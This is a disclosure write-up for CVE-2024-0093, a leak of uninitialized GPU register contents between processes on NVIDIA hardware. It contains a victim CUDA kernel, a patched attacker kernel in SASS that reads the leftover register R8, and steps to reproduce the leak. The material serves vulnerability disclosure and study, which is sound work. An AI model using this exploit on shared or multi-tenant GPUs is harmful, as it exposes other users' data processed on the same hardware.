# CVE-2024-0093: Previous State Leakage on NVIDIA GPUs

## Summary
On NVIDIA GPUs, the state of a shader/CUDA program running on the GPU are not initialized to zero. Resultingly, a CUDA program can leak data about other, previously executed CUDA programs.

This means that one process can maliciously read data processed by another process, if it is using the GPU for calculations.

## Exploitation
First, I compiled a small CUDA program:
```
extern "C" __global__ void fuzzer_kernel(int *a, int *b, int *c)
{
    int tid = blockIdx.x;
    c[tid] = a[tid] + b[tid];
}
```
The disassembly:
```
Normal kernel:
        /*0000*/                   MOV R1, c[0x0][0x28] ;           /* 0x00000a0000017a02 */
                                                                    /* 0x000fc40000000f00 */
        /*0010*/                   S2UR UR8, SR_CTAID.X ;           /* 0x00000000000879c3 */
                                                                    /* 0x000e220000002500 */
        /*0020*/                   UMOV UR9, 0x4 ;                  /* 0x0000000400097882 */
                                                                    /* 0x000fe40000000000 */
        /*0030*/                   ULDC.64 UR4, c[0x0][0x160] ;     /* 0x0000580000047ab9 */
                                                                    /* 0x000fe40000000a00 */
        /*0040*/                   ULDC.64 UR6, c[0x0][0x168] ;     /* 0x00005a0000067ab9 */
                                                                    /* 0x000fe40000000a00 */
        /*0050*/                   UIMAD.WIDE UR4, UR8, UR9, UR4 ;  /* 0x00000009080472a5 */
                                                                    /* 0x001fe4000f8e0204 */
        /*0060*/                   UIMAD.WIDE UR6, UR8, UR9, UR6 ;  /* 0x00000009080672a5 */
                                                                    /* 0x000fce000f8e0206 */
        /*0070*/                   LDG.E.SYS R0, [UR4] ;            /* 0x00000004ff007981 */
                                                                    /* 0x000ea8000c1ee900 */
        /*0080*/                   LDG.E.SYS R3, [UR6] ;            /* 0x00000006ff037981 */
                                                                    /* 0x000ea2000c1ee900 */
        /*0090*/                   ULDC.64 UR4, c[0x0][0x170] ;     /* 0x00005c0000047ab9 */
                                                                    /* 0x000fe40000000a00 */
        /*00a0*/                   UIMAD.WIDE UR4, UR8, UR9, UR4 ;  /* 0x00000009080472a5 */
                                                                    /* 0x000fe2000f8e0204 */
        /*00b0*/                   IADD3 R0, R0, R3, RZ ;           /* 0x0000000300007210 */
                                                                    /* 0x004fd00007ffe0ff */
        /*00c0*/                   STG.E.SYS [UR4], R0 ;            /* 0x00000000ff007986 */
                                                                    /* 0x000fe2000c10e904 */
        /*00d0*/                   EXIT ;                           /* 0x000000000000794d */
                                                                    /* 0x000fea0003800000 */
        /*00e0*/                   BRA 0xe0;                        /* 0xfffffff000007947 */
                                                                    /* 0x000fc0000383ffff */
        /*00f0*/                   NOP;                             /* 0x0000000000007918 */
                                                                    /* 0x000fc00000000000 */
```
In order to leak an uninitialized register,the instruction at `00c0` is modified. When changing it from `STG.E.SYS [UR4], R0` to `STG.E.SYS [UR4], R8`, the contents of R8 are returned instead of the original result.

However, since `R8` is not initialized to a default value (such as zero), it still contains data from another CUDA program which executed previously, thus leaking data which was previously processed on the GPU.

## Proof-of-Concept
For the PoC, a victim and an attacker program are provided. 

### Victim Program
The victim program executes a CUDA program on the GPU:
```
__global__ void victimKernel(int* a, int* b, int* c, int *d, int *e) {
    int idx = blockIdx.x;
    int tmp = 0x12346 + c[idx];

    b[idx] = a[idx];
    d[idx] = tmp - e[idx];
}
```
The input arrays are initialized to the following values:
```
a (in): 0x41414141
c (in): 0x42411efd
e (in): 1
```
`b` and `d` are used as output.

The attacker successfully leaks data from this victim program, if one of these values or intermediate results are read from an uninitialized register:
```
0x41414141
0x42411efd
0x42424242 (because: 0x12346 + 0x42411efd(array c) - 1(array e))
```
If we read one of those from `R8`, we determine that leakage was successful.

### Attacker Program
The attacker executes the following CUDA program on the GPU:
```
        /*0000*/                   MOV R1, c[0x0][0x28] ;           /* 0x00000a0000017a02 */
                                                                    /* 0x000fc40000000f00 */
        /*0010*/                   S2UR UR8, SR_CTAID.X ;           /* 0x00000000000879c3 */
                                                                    /* 0x000e220000002500 */
        /*0020*/                   UMOV UR9, 0x4 ;                  /* 0x0000000400097882 */
                                                                    /* 0x000fe40000000000 */
        /*0030*/                   ULDC.64 UR4, c[0x0][0x160] ;     /* 0x0000580000047ab9 */
                                                                    /* 0x000fe40000000a00 */
        /*0040*/                   ULDC.64 UR6, c[0x0][0x168] ;     /* 0x00005a0000067ab9 */
                                                                    /* 0x000fe40000000a00 */
        /*0050*/                   UIMAD.WIDE UR4, UR8, UR9, UR4 ;  /* 0x00000009080472a5 */
                                                                    /* 0x001fe4000f8e0204 */
        /*0060*/                   UIMAD.WIDE UR6, UR8, UR9, UR6 ;  /* 0x00000009080672a5 */
                                                                    /* 0x000fce000f8e0206 */
        /*0070*/                   LDG.E.SYS R0, [UR4] ;            /* 0x00000004ff007981 */
                                                                    /* 0x000ea8000c1ee900 */
        /*0080*/                   LDG.E.SYS R3, [UR6] ;            /* 0x00000006ff037981 */
                                                                    /* 0x000ea2000c1ee900 */
        /*0090*/                   ULDC.64 UR4, c[0x0][0x170] ;     /* 0x00005c0000047ab9 */
                                                                    /* 0x000fe40000000a00 */
        /*00a0*/                   UIMAD.WIDE UR4, UR8, UR9, UR4 ;  /* 0x00000009080472a5 */
                                                                    /* 0x000fe2000f8e0204 */
        /*00b0*/                   IADD3 R0, R0, R3, RZ ;           /* 0x0000000300007210 */
                                                                    /* 0x004fd00007ffe0ff */
        /*00c0*/                   STG.E.SYS [UR4], R8 ;            /* 0x00000008ff007986 */ <- CHANGE IS HERE
                                                                    /* 0x000fe2000c10e904 */
        /*00d0*/                   EXIT ;                           /* 0x000000000000794d */
                                                                    /* 0x000fea0003800000 */
        /*00e0*/                   BRA 0xe0;                        /* 0xfffffff000007947 */
                                                                    /* 0x000fc0000383ffff */
        /*00f0*/                   NOP;                             /* 0x0000000000007918 */
                                                                    /* 0x000fc00000000000 */
```
The changed instruction (see Exploitation section) is marked.

## Steps for Reproducing
I provided both the source code and prebuild binaries for the proof-of-concept. The code is intended to run on a Linux machine. The tested setup is:
- RTX 2060
- Driver Version: 535.54.03
- CUDA Version: 12.2
- Ubuntu 23.04
- Kernel: Linux 6.2.0-25-generic #25-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 16 17:05:07 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

In order to build the PoC, use `build.sh`.

1) First, execute the victim program: `./build/Victim`
2) In another terminal, navigate to the same folder. Next, execute the attacker program: `./attacker.sh`

If the attacker was able to successfully leak data, the attacker terminal output should look like this:
```
...
0x42424242 0x42424242 0x42424242 0x42424242 0x42424242 0x42424242 
0x42424242 0x42424242 0x42424242 0x42424242 0x42424242 0x42424242 
0x42424242 0x42424242 0x42424242 0x42424242 0x42424242 0x42424242 
0x42424242 0x42424242 0x42424242 0x42424242 0x42424242 0x42424242 
0x42424242 0x42424242 0x42424242 0x42424242 0x42424242 0x42424242 
0x42424242 0x42424242 
successfully leaked magic value!
```